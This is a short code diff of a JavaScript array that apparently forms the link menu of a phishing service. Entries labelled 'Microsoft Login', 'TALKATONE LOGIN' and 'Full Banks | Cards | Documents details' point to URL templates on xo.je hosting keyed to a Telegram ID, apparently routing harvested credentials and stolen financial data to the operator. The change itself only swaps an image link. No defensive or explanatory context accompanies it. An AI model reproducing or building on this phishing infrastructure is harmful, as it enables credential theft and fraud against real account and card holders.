@@ -1,5 +1,5 @@
 const premiumLinks = [ 
-{ name: "Full Banks | Cards | Documents details", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa1l_hp-hyt9Ll7Ct3Nv0RNXwJyoF478iPz67sPLMlxg&s=10", urlTemplate: "https://nexusggvet.xo.je/nexus/nexus.html?id={telegram-id}" },
+{ name: "Full Banks | Cards | Documents details", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRljYR5iTAkiZtuAvJ6idi59ktv81bzEMYJl_I38zgN94rISNtL2e4k0Ics&s=10", urlTemplate: "https://nexusggvet.xo.je/nexus/nexus.html?id={telegram-id}" },
 { name: "All social media link boost followers", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa1l_hp-hyt9Ll7Ct3Nv0RNXwJyoF478iPz67sPLMlxg&s=10", urlTemplate: "https://boostmass.xo.je?admin={telegram-id}" },
  { name: "Microsoft Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShA3GucdBAdvpqnOIWjucVYrqzYfNcZdU3Dw&s", urlTemplate: "https://nvhopmiopa.xo.je/a/a1?id={telegram-id}" },
 { name: "TALKATONE LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKdihiI6UETynk7yUXocw-DyCDT2SN2rzvHR93zy-arg&s=10", urlTemplate: "https://nvhopmiopa.xo.je/a/a2?id={telegram-id}" },
